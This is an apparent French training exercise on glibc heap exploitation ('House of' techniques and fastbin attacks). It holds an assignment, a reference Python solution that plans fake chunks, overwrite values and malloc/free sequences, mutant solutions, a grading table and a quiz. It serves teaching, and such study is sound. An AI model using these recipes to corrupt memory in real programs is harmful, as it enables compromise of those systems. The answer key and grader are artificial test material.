# Exercice 3.4.7-c : houses_heap

**Module :**
3.4.7 — Heap Exploitation

**Concept :**
c — Techniques classiques "House of" et Fastbin Attacks

**Difficulte :**
★★★★★★★★★☆ (9/10)

**Type :**
code

**Tiers :**
3 — Synthese partielle

**Langage :**
Python 3.12

**Prerequis :**
- Exercices 3.4.7-a et 3.4.7-b
- Comprehension des bins (fastbins, smallbins)
- Mecanismes de coalescing
- Notion de fake chunks

**Domaines :**
Heap, Exploit, Technique

**Duree estimee :**
150 min

**XP Base :**
450

**Complexite :**
T4 O(n log n) x S3 O(n)

---

## SECTION 1 : PROTOTYPE & CONSIGNE

### 1.1 Obligations

**Fichier a rendre :**
`houses_heap.py`

**Fonctions autorisees :**
- `json` (module standard)
- `struct` (parsing binaire)
- `sys` (arguments)
- Fonctions built-in Python

**Fonctions interdites :**
- pwntools
- Librairies d'exploitation automatique

### 1.2 Consigne

#### 2.4.1 Contexte Culturel — "Game of Thrones"

*"When you play the game of thrones, you win or you die."*

Dans **Game of Thrones**, chaque grande maison a ses strategies uniques pour prendre le pouvoir : les Stark avec leur honneur, les Lannister avec leur or, les Targaryen avec leurs dragons. Les "Houses" du heap exploitation sont similaires : chaque technique a ses propres prerequis, forces, et conditions de victoire.

House of Spirit manipule le heap depuis la stack, House of Force controle le wilderness, House of Einherjar exploite le off-by-one. Comme les seigneurs de Westeros, tu dois choisir la bonne strategie selon le terrain.

#### 2.4.2 Enonce Academique

Les techniques "House of" sont des patterns d'exploitation heap classiques, chacune exploitant une faiblesse specifique de l'allocateur. Ce sont les fondations de l'exploitation heap moderne.

**Ta mission :**

Ecrire un programme `houses_heap.py` qui :

1. **Analyse** un scenario d'exploitation (primitives disponibles)
2. **Determine** quelle(s) technique(s) sont applicables
3. **Genere** les payloads et sequences d'operations
4. **Simule** l'effet sur l'etat du heap
5. **Verifie** les preconditions de chaque technique

**Techniques implementees :**

| Technique | Primitive | Description |
|-----------|-----------|-------------|
| House of Spirit | Fake chunk sur stack | free() un faux chunk, malloc() retourne stack |
| House of Force | Top chunk overflow | Controler les allocations futures |
| House of Einherjar | Off-by-one null | Consolidation malveillante |
| Fastbin Dup | Double-free | Meme chunk dans fastbin 2 fois |
| Fastbin Attack | Allocation arbitraire | Similaire tcache poison pour fastbins |

**Entree :**
- Fichier JSON contenant :
  - `glibc_version` : Version cible
  - `primitive` : Type de vulnerabilite ("stack_buffer", "heap_overflow", "off_by_one", "double_free", "uaf")
  - `target` : Cible d'exploitation ("stack", "got", "hook", "arbitrary")
  - `heap_state` : Etat initial du heap (optionnel)
  - `constraints` : Contraintes (taille, alignement, etc.)

**Sortie :**
- JSON avec technique recommandee, payload, operations, et simulation

**Exemples :**

| Entree | Sortie |
|--------|--------|
| `{"primitive": "stack_buffer", "target": "stack", "glibc_version": "2.23"}` | `{"technique": "house_of_spirit", "fake_chunk": {...}, "operations": [...]}` |
| `{"primitive": "heap_overflow", "target": "arbitrary", "glibc_version": "2.23"}` | `{"technique": "house_of_force", "payload": {...}, "operations": [...]}` |

### 1.3 Prototype

```python
#!/usr/bin/env python3
"""
houses_heap.py - Generateur de techniques House of
"""

import json
import struct
import sys

class HeapTechnique:
    """Base class pour les techniques d'exploitation."""

    def __init__(self, glibc_version: str):
        self.glibc_version = glibc_version
        self.version_tuple = tuple(map(int, glibc_version.split('.')))

    def check_prerequisites(self, scenario: dict) -> tuple:
        """Verifie si la technique est applicable."""
        raise NotImplementedError

    def generate_payload(self, scenario: dict) -> dict:
        """Genere le payload d'exploitation."""
        raise NotImplementedError

    def generate_operations(self, scenario: dict) -> list:
        """Genere la sequence d'operations."""
        raise NotImplementedError


class HouseOfSpirit(HeapTechnique):
    """
    House of Spirit : free() un fake chunk sur la stack.

    Prerequis:
    - Controle d'un pointeur passe a free()
    - Capacite de creer un fake chunk valide en memoire
    - size du fake chunk dans range fastbin (0x20-0x80)
    """

    def check_prerequisites(self, scenario: dict) -> tuple:
        pass

    def generate_payload(self, scenario: dict) -> dict:
        pass


class HouseOfForce(HeapTechnique):
    """
    House of Force : overflow le top chunk pour controler malloc().

    Prerequis:
    - Heap overflow atteignant le top chunk size
    - Connaissance de l'adresse heap
    - Capacite de controler la taille d'allocation
    """

    def check_prerequisites(self, scenario: dict) -> tuple:
        pass

    def generate_payload(self, scenario: dict) -> dict:
        pass


class HouseOfEinherjar(HeapTechnique):
    """
    House of Einherjar : off-by-one null pour consolidation.

    Prerequis:
    - Off-by-one permettant de clear PREV_INUSE
    - Capacite de controler prev_size
    - Fake chunk a l'adresse cible
    """

    def check_prerequisites(self, scenario: dict) -> tuple:
        pass

    def generate_payload(self, scenario: dict) -> dict:
        pass


class FastbinDup(HeapTechnique):
    """
    Fastbin Dup : double-free dans les fastbins.

    Prerequis:
    - Capacite de double-free (ou UAF)
    - glibc < 2.29 (ou bypass tcache)
    - Taille dans range fastbin
    """

    def check_prerequisites(self, scenario: dict) -> tuple:
        pass

    def generate_payload(self, scenario: dict) -> dict:
        pass


def analyze_scenario(data: dict) -> dict:
    """
    Analyse un scenario et recommande la meilleure technique.

    Args:
        data: Configuration du scenario

    Returns:
        Dictionnaire avec technique, payload, operations
    """
    pass


def main():
    """Point d'entree principal."""
    pass

if __name__ == "__main__":
    main()
```

---

## SECTION 2 : LE SAVIEZ-VOUS ?

### L'origine des "Houses"

Le terme "House of" vient de la phrack magazine et de divers articles de recherche en securite. Chaque technique porte un nom memorable :
- **House of Spirit** : Le "spirit" fait reference au fantome (fake chunk qui apparait de nulle part)
- **House of Force** : La "force" pour forcer l'allocateur a faire ce qu'on veut
- **House of Einherjar** : Les Einherjar sont les guerriers tombes au combat dans la mythologie nordique

### Evolution historique

| Annee | Technique | Auteur/Source |
|-------|-----------|---------------|
| 2005 | House of Mind | Phantasmal Phantasmagoria |
| 2005 | House of Force | Phantasmal Phantasmagoria |
| 2005 | House of Spirit | Phantasmal Phantasmagoria |
| 2014 | House of Einherjar | Hiroki Matsukuma |
| 2016 | House of Orange | 4ngelboy |

---

## SECTION 2.5 : DANS LA VRAIE VIE

**Metier : Vulnerability Researcher**

Ces techniques sont utilisees dans :
- **Exploitation de navigateurs** : Chrome, Firefox heap exploits
- **Embedded systems** : IoT devices avec vieilles glibc
- **CTF competitions** : Challenges heap classiques
- **CVE exploitation** : Techniques adaptees pour exploits reels

**Cas d'usage concret :**
Lors de Pwn2Own, les chercheurs combinent souvent plusieurs techniques :
1. Information leak via format string
2. House of Force pour positionner chunks
3. Tcache poison pour GOT overwrite
4. ROP chain vers shell

---

## SECTION 3 : EXEMPLE D'UTILISATION

### 3.0 Session bash

```bash
$ cat scenario_spirit.json
{
  "glibc_version": "2.23",
  "primitive": "controlled_free",
  "target": "stack",
  "stack_buffer_addr": "0x7fffffffe000",
  "stack_buffer_size": 128,
  "constraints": {
    "fastbin_only": true
  }
}

$ python3 houses_heap.py scenario_spirit.json
{
  "technique": "house_of_spirit",
  "description": "Free a fake chunk on the stack, then malloc() returns stack address",
  "prerequisites_met": true,
  "prerequisites": [
    {"name": "controlled_free", "status": "OK"},
    {"name": "stack_buffer_writable", "status": "OK"},
    {"name": "fastbin_size_available", "status": "OK"}
  ],
  "fake_chunk": {
    "address": "0x7fffffffe000",
    "layout": {
      "prev_size": 0,
      "size": "0x41",
      "next_chunk_size": "0x21",
      "explanation": "Size 0x41 = 0x40 + PREV_INUSE, next chunk needs valid size"
    },
    "payload_hex": "0000000000000000 4100000000000000 4141414141414141..."
  },
  "operations": [
    {"step": 1, "action": "setup_fake_chunk", "addr": "0x7fffffffe000",
     "note": "Write fake chunk header on stack"},
    {"step": 2, "action": "setup_next_chunk", "addr": "0x7fffffffe040",
     "note": "Write valid size for next chunk check"},
    {"step": 3, "action": "free", "target": "0x7fffffffe010",
     "note": "free(fake_chunk+0x10) - user data ptr"},
    {"step": 4, "action": "malloc", "size": 48, "result": "stack_ptr",
     "note": "Returns 0x7fffffffe010 - stack control!"}
  ],
  "security_checks_bypassed": [
    "fastbin size check (0x20-0x80): 0x40 OK",
    "next chunk size sanity: 0x20 OK"
  ]
}

$ cat scenario_force.json
{
  "glibc_version": "2.23",
  "primitive": "heap_overflow",
  "target": "arbitrary",
  "heap_base": "0x602000",
  "target_addr": "0x601000",
  "constraints": {
    "overflow_size": "unlimited"
  }
}

$ python3 houses_heap.py scenario_force.json
{
  "technique": "house_of_force",
  "description": "Overwrite top chunk size to control future allocations",
  "prerequisites_met": true,
  "top_chunk_overflow": {
    "current_addr": "0x602020",
    "overwrite_size": "0xffffffffffffffff",
    "explanation": "Set size to -1 to allow any allocation"
  },
  "evil_allocation": {
    "distance": "-0x1030",
    "malloc_size": "0xffffffffffffefc0",
    "explanation": "malloc(distance - 0x10) wraps around to target"
  },
  "operations": [
    {"step": 1, "action": "overflow", "target": "top_chunk.size",
     "value": "0xffffffffffffffff"},
    {"step": 2, "action": "malloc", "size": "0xffffffffffffefc0",
     "note": "Moves top chunk backward to target"},
    {"step": 3, "action": "malloc", "size": 32, "result": "target_ptr",
     "note": "Returns address near 0x601000!"}
  ],
  "warnings": [
    "Requires 64-bit system",
    "May crash on some glibc versions",
    "Blocked by tcache on glibc 2.26+"
  ]
}
```

---

## SECTION 3.1 : BONUS STANDARD (OPTIONNEL)

**Difficulte Bonus :**
★★★★★★★★★★ (10/10)

**Recompense :**
XP x2

### 3.1.1 Consigne Bonus

**Extension "Multi-House Strategy" :**

1. **Combiner plusieurs techniques** en une chaine d'exploitation
2. **Adapter automatiquement** selon les protections detectees
3. **Generer des alternatives** si la technique principale echoue
4. **Simuler l'etat du heap** apres chaque operation

---

## SECTION 4 : ZONE CORRECTION

### 4.1 Moulinette

| Test | Entree | Sortie Attendue | Points |
|------|--------|-----------------|--------|
| spirit_basic | controlled_free, stack | technique: house_of_spirit | 15 |
| force_basic | heap_overflow, arbitrary | technique: house_of_force | 15 |
| einherjar_basic | off_by_one, consolidate | technique: house_of_einherjar | 15 |
| fastbin_dup | double_free, glibc<2.29 | technique: fastbin_dup | 15 |
| prerequisite_fail | missing prereq | prerequisites_met: false | 10 |
| fake_chunk_gen | house_of_spirit | Valid fake chunk struct | 10 |
| version_check | glibc 2.35 | Warnings about mitigations | 10 |
| size_calc_force | House of Force math | Correct distance/size | 10 |

### 4.2 Solution de reference

```python
#!/usr/bin/env python3
"""
houses_heap.py - Solution de reference
"""

import json
import struct
import sys

def parse_hex(value) -> int:
    if isinstance(value, int):
        return value
    value = str(value).strip()
    if value.lower().startswith('0x') or value.lower().startswith('-0x'):
        return int(value, 16)
    return int(value)

class HeapTechnique:
    def __init__(self, glibc_version: str):
        self.glibc_version = glibc_version
        self.version_tuple = tuple(map(int, glibc_version.split('.')))

    def check_prerequisites(self, scenario: dict) -> tuple:
        raise NotImplementedError

    def generate_payload(self, scenario: dict) -> dict:
        raise NotImplementedError

    def generate_operations(self, scenario: dict) -> list:
        raise NotImplementedError


class HouseOfSpirit(HeapTechnique):
    """House of Spirit implementation."""

    FASTBIN_MIN = 0x20
    FASTBIN_MAX = 0x80

    def check_prerequisites(self, scenario: dict) -> tuple:
        prereqs = []
        all_met = True

        # Check controlled free
        has_free = scenario.get('primitive') in ['controlled_free', 'uaf']
        prereqs.append({
            'name': 'controlled_free',
            'status': 'OK' if has_free else 'MISSING',
            'required': 'Ability to call free() on arbitrary address'
        })
        if not has_free:
            all_met = False

        # Check stack buffer
        stack_addr = scenario.get('stack_buffer_addr')
        prereqs.append({
            'name': 'stack_buffer_writable',
            'status': 'OK' if stack_addr else 'MISSING',
            'required': 'Writable stack buffer for fake chunk'
        })
        if not stack_addr:
            all_met = False

        # Check glibc version (harder on modern glibc)
        if self.version_tuple >= (2, 26):
            prereqs.append({
                'name': 'tcache_consideration',
                'status': 'WARNING',
                'note': 'glibc 2.26+ has tcache, need to fill it first'
            })

        return (all_met, prereqs)

    def generate_payload(self, scenario: dict) -> dict:
        stack_addr = parse_hex(scenario.get('stack_buffer_addr', 0))

        # Fake chunk size (pick middle of fastbin range)
        fake_size = 0x41  # 0x40 + PREV_INUSE flag

        # Build fake chunk
        fake_chunk = struct.pack('<QQ',
            0,           # prev_size
            fake_size    # size with PREV_INUSE
        )

        # Next chunk (for size sanity check)
        next_chunk_offset = 0x40
        next_chunk_size = 0x21  # Valid small size

        return {
            'address': hex(stack_addr),
            'layout': {
                'prev_size': 0,
                'size': hex(fake_size),
                'next_chunk_size': hex(next_chunk_size),
                'next_chunk_offset': hex(next_chunk_offset)
            },
            'payload_hex': fake_chunk.hex(),
            'user_data_ptr': hex(stack_addr + 0x10)
        }

    def generate_operations(self, scenario: dict) -> list:
        stack_addr = parse_hex(scenario.get('stack_buffer_addr', 0))
        user_ptr = stack_addr + 0x10

        ops = [
            {'step': 1, 'action': 'setup_fake_chunk',
             'addr': hex(stack_addr),
             'note': 'Write fake chunk header (prev_size=0, size=0x41)'},
            {'step': 2, 'action': 'setup_next_chunk',
             'addr': hex(stack_addr + 0x40),
             'note': 'Write valid size (0x21) for next chunk validation'},
            {'step': 3, 'action': 'free',
             'target': hex(user_ptr),
             'note': f'free({hex(user_ptr)}) - free the fake chunk'},
            {'step': 4, 'action': 'malloc',
             'size': 0x38,
             'result': 'stack_ptr',
             'note': f'Returns {hex(user_ptr)} - stack control!'}
        ]

        # Add tcache fill if needed
        if self.version_tuple >= (2, 26):
            tcache_fill = [
                {'step': 0, 'action': 'fill_tcache',
                 'size': 0x38, 'count': 7,
                 'note': 'Fill tcache[0x40] to force fastbin use'}
            ]
            for i, op in enumerate(ops):
                op['step'] = i + 1
            ops = tcache_fill + ops

        return ops


class HouseOfForce(HeapTechnique):
    """House of Force implementation."""

    def check_prerequisites(self, scenario: dict) -> tuple:
        prereqs = []
        all_met = True

        # Check heap overflow
        has_overflow = scenario.get('primitive') == 'heap_overflow'
        prereqs.append({
            'name': 'heap_overflow',
            'status': 'OK' if has_overflow else 'MISSING'
        })
        if not has_overflow:
            all_met = False

        # Check heap leak
        heap_base = scenario.get('heap_base')
        prereqs.append({
            'name': 'heap_leak',
            'status': 'OK' if heap_base else 'MISSING'
        })
        if not heap_base:
            all_met = False

        # Check glibc version
        if self.version_tuple >= (2, 29):
            prereqs.append({
                'name': 'glibc_version',
                'status': 'BLOCKED',
                'note': 'House of Force blocked on glibc 2.29+ (top size check)'
            })
            all_met = False

        return (all_met, prereqs)

    def generate_payload(self, scenario: dict) -> dict:
        heap_base = parse_hex(scenario.get('heap_base', 0))
        target_addr = parse_hex(scenario.get('target_addr', 0))

        # Assume top chunk is right after initial allocation
        top_chunk_addr = heap_base + 0x20

        # Distance to target
        distance = target_addr - top_chunk_addr - 0x20

        # Size for evil malloc (unsigned math)
        if distance < 0:
            evil_size = (distance - 0x10) & 0xffffffffffffffff
        else:
            evil_size = distance - 0x10

        return {
            'top_chunk_addr': hex(top_chunk_addr),
            'overwrite_size': '0xffffffffffffffff',
            'target': hex(target_addr),
            'distance': hex(distance & 0xffffffffffffffff),
            'evil_malloc_size': hex(evil_size)
        }

    def generate_operations(self, scenario: dict) -> list:
        payload = self.generate_payload(scenario)

        return [
            {'step': 1, 'action': 'overflow',
             'target': 'top_chunk.size',
             'value': payload['overwrite_size'],
             'note': 'Overwrite top chunk size to -1'},
            {'step': 2, 'action': 'malloc',
             'size': payload['evil_malloc_size'],
             'note': f'Evil allocation, moves top to {payload["target"]}'},
            {'step': 3, 'action': 'malloc',
             'size': 32,
             'result': 'target_ptr',
             'note': 'Next allocation returns target address!'}
        ]


class HouseOfEinherjar(HeapTechnique):
    """House of Einherjar implementation."""

    def check_prerequisites(self, scenario: dict) -> tuple:
        prereqs = []
        all_met = True

        # Check off-by-one
        has_obo = scenario.get('primitive') in ['off_by_one', 'off_by_null']
        prereqs.append({
            'name': 'off_by_one_null',
            'status': 'OK' if has_obo else 'MISSING'
        })
        if not has_obo:
            all_met = False

        # Check heap leak
        heap_base = scenario.get('heap_base')
        prereqs.append({
            'name': 'heap_leak',
            'status': 'OK' if heap_base else 'NEEDED'
        })

        return (all_met, prereqs)

    def generate_payload(self, scenario: dict) -> dict:
        return {
            'description': 'Off-by-null clears PREV_INUSE of next chunk',
            'effect': 'Triggers backward consolidation with fake prev_size',
            'fake_prev_size': 'Points to controlled area for overlapping chunks'
        }

    def generate_operations(self, scenario: dict) -> list:
        return [
            {'step': 1, 'action': 'malloc', 'size': 0x100, 'result': 'chunk_a'},
            {'step': 2, 'action': 'malloc', 'size': 0x100, 'result': 'chunk_b'},
            {'step': 3, 'action': 'malloc', 'size': 0x100, 'result': 'chunk_c',
             'note': 'Guard chunk'},
            {'step': 4, 'action': 'free', 'target': 'chunk_a',
             'note': 'chunk_a goes to unsorted bin'},
            {'step': 5, 'action': 'off_by_null', 'target': 'chunk_b',
             'note': 'Overflow null byte into chunk_c.prev_inuse'},
            {'step': 6, 'action': 'set_prev_size', 'target': 'chunk_c',
             'value': '0x210',
             'note': 'Fake prev_size pointing back past chunk_b'},
            {'step': 7, 'action': 'free', 'target': 'chunk_c',
             'note': 'Triggers consolidation, overlapping chunk_b!'}
        ]


class FastbinDup(HeapTechnique):
    """Fastbin Dup implementation."""

    def check_prerequisites(self, scenario: dict) -> tuple:
        prereqs = []
        all_met = True

        has_df = scenario.get('primitive') in ['double_free', 'uaf']
        prereqs.append({
            'name': 'double_free_or_uaf',
            'status': 'OK' if has_df else 'MISSING'
        })
        if not has_df:
            all_met = False

        if self.version_tuple >= (2, 29):
            prereqs.append({
                'name': 'tcache_key_bypass',
                'status': 'WARNING',
                'note': 'Need to corrupt tcache key for double-free'
            })

        return (all_met, prereqs)

    def generate_operations(self, scenario: dict) -> list:
        if self.version_tuple < (2, 26):
            return [
                {'step': 1, 'action': 'malloc', 'size': 0x68, 'result': 'a'},
                {'step': 2, 'action': 'malloc', 'size': 0x68, 'result': 'b'},
                {'step': 3, 'action': 'free', 'target': 'a'},
                {'step': 4, 'action': 'free', 'target': 'b'},
                {'step': 5, 'action': 'free', 'target': 'a',
                 'note': 'Double-free! fastbin: a -> b -> a'},
                {'step': 6, 'action': 'malloc', 'size': 0x68, 'result': 'c',
                 'note': 'Gets a'},
                {'step': 7, 'action': 'write', 'target': 'c.fd', 'value': 'target'},
                {'step': 8, 'action': 'malloc', 'size': 0x68,
                 'note': 'Gets b'},
                {'step': 9, 'action': 'malloc', 'size': 0x68,
                 'note': 'Gets a again'},
                {'step': 10, 'action': 'malloc', 'size': 0x68,
                 'result': 'target_ptr',
                 'note': 'Gets target!'}
            ]
        else:
            return [
                {'step': 0, 'action': 'fill_tcache', 'size': 0x68, 'count': 7},
                # ... rest similar but with tcache considerations
            ]

    def generate_payload(self, scenario: dict) -> dict:
        return {'technique': 'fastbin_dup', 'note': 'Classic double-free attack'}


TECHNIQUES = {
    'house_of_spirit': HouseOfSpirit,
    'house_of_force': HouseOfForce,
    'house_of_einherjar': HouseOfEinherjar,
    'fastbin_dup': FastbinDup
}

def select_technique(scenario: dict) -> str:
    """Select the best technique based on primitives and target."""
    primitive = scenario.get('primitive', '')
    target = scenario.get('target', '')

    if primitive == 'controlled_free' and target == 'stack':
        return 'house_of_spirit'
    elif primitive == 'heap_overflow' and target == 'arbitrary':
        return 'house_of_force'
    elif primitive in ['off_by_one', 'off_by_null']:
        return 'house_of_einherjar'
    elif primitive in ['double_free', 'uaf']:
        return 'fastbin_dup'

    return 'unknown'

def analyze_scenario(data: dict) -> dict:
    glibc_version = data.get('glibc_version', '2.31')

    technique_name = select_technique(data)
    if technique_name == 'unknown':
        return {'error': 'No suitable technique found for this scenario'}

    technique_class = TECHNIQUES.get(technique_name)
    if not technique_class:
        return {'error': f'Technique {technique_name} not implemented'}

    technique = technique_class(glibc_version)
    prereqs_met, prereqs = technique.check_prerequisites(data)

    result = {
        'technique': technique_name,
        'glibc_version': glibc_version,
        'prerequisites_met': prereqs_met,
        'prerequisites': prereqs
    }

    if prereqs_met:
        result['payload'] = technique.generate_payload(data)
        result['operations'] = technique.generate_operations(data)

    return result

def main():
    if len(sys.argv) < 2:
        print("Usage: houses_heap.py <scenario.json | ->", file=sys.stderr)
        sys.exit(1)

    input_file = sys.argv[1]

    if input_file == '-':
        data = json.load(sys.stdin)
    else:
        with open(input_file, 'r') as f:
            data = json.load(f)

    result = analyze_scenario(data)
    print(json.dumps(result, indent=2))

if __name__ == "__main__":
    main()
```

### 4.3 Solutions Mutantes

```python
# Mutant A: Mauvais calcul House of Force
def calc_evil_size_mutant(distance):
    return distance  # Oublie le -0x10 pour le header!

# Mutant B: Mauvaise taille fake chunk House of Spirit
def spirit_fake_size_mutant():
    return 0x100  # Hors range fastbin!

# Mutant C: Oublie PREV_INUSE dans fake chunk
def spirit_size_mutant():
    return 0x40  # Manque le flag P=1!

# Mutant D: Ignore les checks glibc version
def check_version_mutant(scenario):
    return (True, [])  # Ignore toutes les protections!

# Mutant E: Operations dans le mauvais ordre
def einherjar_ops_mutant():
    return [
        {'action': 'free', 'target': 'chunk_c'},  # Free avant off-by-null!
        {'action': 'off_by_null'},
    ]
```

---

## SECTION 5 : COMPRENDRE

### 5.1 Ce que cet exercice enseigne

1. **Techniques classiques** : Fondations de l'exploitation heap
2. **Selection de technique** : Choisir selon les primitives
3. **Preconditions** : Comprendre ce qui est necessaire
4. **Evolution glibc** : Adapter aux protections

### 5.2 Visualisation ASCII - House of Spirit

```
                    HOUSE OF SPIRIT
    ┌─────────────────────────────────────────────────────────┐
    │  ETAPE 1: Preparer le fake chunk sur la stack          │
    │                                                         │
    │  Stack:                                                 │
    │  ┌─────────────────┐ 0x7fffffffe000                    │
    │  │ prev_size = 0   │                                    │
    │  ├─────────────────┤ +0x08                             │
    │  │ size = 0x41     │ ◄── PREV_INUSE set                │
    │  ├─────────────────┤ +0x10 (user data ptr)             │
    │  │ (controllable)  │ ◄── Ce qu'on veut controler       │
    │  │      ...        │                                    │
    │  ├─────────────────┤ +0x40 (next chunk)                │
    │  │ size = 0x21     │ ◄── Passe le sanity check         │
    │  └─────────────────┘                                    │
    │                                                         │
    │  ETAPE 2: free(0x7fffffffe010)                         │
    │                                                         │
    │  Fastbin[0x40]: stack_chunk ──► (old entries)          │
    │                                                         │
    │  ETAPE 3: malloc(0x38)                                 │
    │                                                         │
    │  Returns: 0x7fffffffe010  ◄── STACK CONTROL!           │
    └─────────────────────────────────────────────────────────┘
```

### 5.3 Visualisation - House of Force

```
                    HOUSE OF FORCE
    ┌─────────────────────────────────────────────────────────┐
    │  AVANT overflow:                                        │
    │                                                         │
    │  Heap:                                                  │
    │  ┌─────────────────┐ heap_base                         │
    │  │   Chunk A       │                                    │
    │  │   (controllable)│                                    │
    │  ├─────────────────┤                                    │
    │  │ TOP CHUNK       │                                    │
    │  │ size = 0x20fe1  │ ◄── Taille normale                │
    │  └─────────────────┘                                    │
    │                                                         │
    │  APRES overflow:                                        │
    │                                                         │
    │  ┌─────────────────┐                                    │
    │  │ TOP CHUNK       │                                    │
    │  │ size = -1       │ ◄── 0xffffffffffffffff             │
    │  └─────────────────┘                                    │
    │                                                         │
    │  malloc(evil_size) fait "reculer" le top chunk         │
    │                                                         │
    │  Target (GOT):     Next malloc() ici!                  │
    │  ┌─────────────────┐                                    │
    │  │ NEW TOP CHUNK   │                                    │
    │  └─────────────────┘                                    │
    └─────────────────────────────────────────────────────────┘
```

---

## SECTION 6 : PIEGES - RECAPITULATIF

| # | Piege | Consequence | Solution |
|---|-------|-------------|----------|
| 1 | Fake chunk sans PREV_INUSE | free() echoue | size \| 1 |
| 2 | Pas de next chunk valid | Sanity check fail | Ajouter next chunk size |
| 3 | House of Force sur glibc >= 2.29 | Top size check | Utiliser autre technique |
| 4 | Oublier de fill tcache | Chunk va dans tcache | 7 allocations/frees avant |
| 5 | Mauvais calcul distance | Allocation au mauvais endroit | Verifier arithmetique |

---

## SECTION 7 : QCM

### Question 1
**Quelle technique utilise un fake chunk sur la stack ?**

A) House of Force
B) House of Spirit
C) House of Einherjar
D) Fastbin Dup

**Reponse : B**

### Question 2
**Que doit-on ecrire dans le top chunk pour House of Force ?**

A) 0
B) -1 (0xffffffffffffffff)
C) L'adresse cible
D) Une taille fastbin

**Reponse : B**

### Question 3
**Quelle primitive est necessaire pour House of Einherjar ?**

A) Heap overflow
B) Double-free
C) Off-by-one (null)
D) Format string

**Reponse : C**

### Question 4
**A partir de quelle version glibc House of Force est-elle bloquee ?**

A) 2.23
B) 2.26
C) 2.29
D) 2.32

**Reponse : C**

### Question 5
**Dans House of Spirit, pourquoi faut-il un "next chunk" valide ?**

A) Pour le coalescing
B) Pour le sanity check de free()
C) Pour le tcache
D) Pour l'alignement

**Reponse : B**

---

## SECTION 8 : RECAPITULATIF

| Element | Valeur |
|---------|--------|
| **Difficulte** | ★★★★★★★★★☆ (9/10) |
| **Temps estime** | 150 min |
| **XP Base** | 450 |
| **Techniques** | Spirit, Force, Einherjar, Fastbin |
| **Prerequis** | heap_anatomy, tcache_poison |

---

## SECTION 9 : DEPLOYMENT PACK

```json
{
  "deploy": {
    "exercise_id": "3.4.7-c",
    "exercise_name": "houses_heap",
    "difficulty": 9,
    "xp_base": 450,
    "tags": ["heap", "house-of", "exploitation", "fastbin", "glibc"]
  }
}
```
